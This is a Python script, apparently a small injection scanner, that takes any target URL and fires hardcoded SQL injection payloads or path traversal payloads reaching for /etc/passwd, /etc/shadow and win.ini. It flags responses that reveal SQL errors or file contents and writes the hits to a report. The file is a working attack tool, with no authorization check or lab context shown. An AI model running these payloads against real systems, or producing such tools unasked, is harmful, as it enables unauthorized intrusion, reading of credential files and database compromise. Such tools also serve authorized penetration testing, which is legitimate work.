import requests
from datetime import datetime

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Dummy:
        def __getattr__(self, _): return ''
    Fore = Style = Dummy()

def run_injection_tests():
    url = input("Enter target URL (e.g. http://target.com/page.php?file=): ")
    print("\nSelect Test Type:")
    print("1. SQL Injection")
    print("2. File Path Traversal (LFI)")

    choice = input("Choice: ")
    results = []

    if choice == "1":
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null, null--",
            "' OR EXISTS(SELECT * FROM users)--",
        ]
        print(f"\n[+] {Fore.YELLOW}Testing SQL Injection...\n{Style.RESET_ALL}")
        for p in payloads:
            test_url = url + p
            try:
                r = requests.get(test_url, timeout=5)
                if "sql" in r.text.lower() or "syntax" in r.text.lower():
                    msg = f"[!] SQLi Found with: {p}"
                    print(Fore.RED + msg)
                    results.append(msg)
                elif r.status_code == 200:
                    msg = f"[?] {p} -> 200 OK (check manually)"
                    print(Fore.YELLOW + msg)
                    results.append(msg)
                else:
                    print(f"[i] {p} -> Status {r.status_code}")
            except Exception as e:
                print(f"[!] Error: {e}")

    elif choice == "2":
        payloads = [
            "../../../../etc/passwd",
            "../../../../../windows/win.ini",
            "../" * 6 + "etc/passwd",
            "../../etc/shadow",
        ]
        print(f"\n[+] {Fore.YELLOW}Testing File Path Traversal (LFI)...\n{Style.RESET_ALL}")
        for p in payloads:
            test_url = url + p
            try:
                r = requests.get(test_url, timeout=5)
                if "root:x:" in r.text or "[extensions]" in r.text:
                    msg = f"[!] LFI Found with: {p}"
                    print(Fore.RED + msg)
                    results.append(msg)
                elif r.status_code == 200:
                    msg = f"[?] {p} -> 200 OK (check manually)"
                    print(Fore.YELLOW + msg)
                    results.append(msg)
                else:
                    print(f"[i] {p} -> Status {r.status_code}")
            except Exception as e:
                print(f"[!] Error: {e}")

    else:
        print(Fore.RED + "[!] Invalid selection.")
        return

    if results:
        filename = f"injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, "w") as f:
            f.write("Injection Test Report\n")
            f.write("======================\n")
            f.write(f"Target: {url}\n")
            f.write(f"Type: {'SQLi' if choice == '1' else 'LFI'}\n\n")
            for line in results:
                f.write(line + "\n")
        print(Fore.GREEN + f"\n[✓] Report saved to {filename}")
